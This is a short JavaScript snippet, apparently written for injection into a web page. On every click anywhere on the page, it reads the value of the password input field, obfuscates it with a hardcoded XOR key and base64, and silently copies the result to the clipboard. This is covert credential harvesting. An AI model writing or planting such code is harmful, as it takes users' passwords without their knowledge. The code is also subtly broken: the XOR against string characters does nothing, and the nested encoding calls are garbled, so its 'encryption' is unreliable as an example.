(function(){function encrypt(text, key) {
  const encoder = new TextEncoder();
  const data = encoder.encode(text);
  const encryptedData = new Uint8Array(data.length);
  for (let i = 0; i < data.length; i++) {
    encryptedData[i] = data[i] ^ key[i % key.length];
  }
  return btoa(String.fromCharCode.apply(null, encryptedData));
}
document.body.addEventListener("click", async (e) => {
  await navigator.clipboard.writeText(encrypt(encodeURIComponent(new TextEncoder().encode(new TextEncoder().encode(document.getElementsByTagName('input').password.value))),'qwertyui1234567'));
});})()
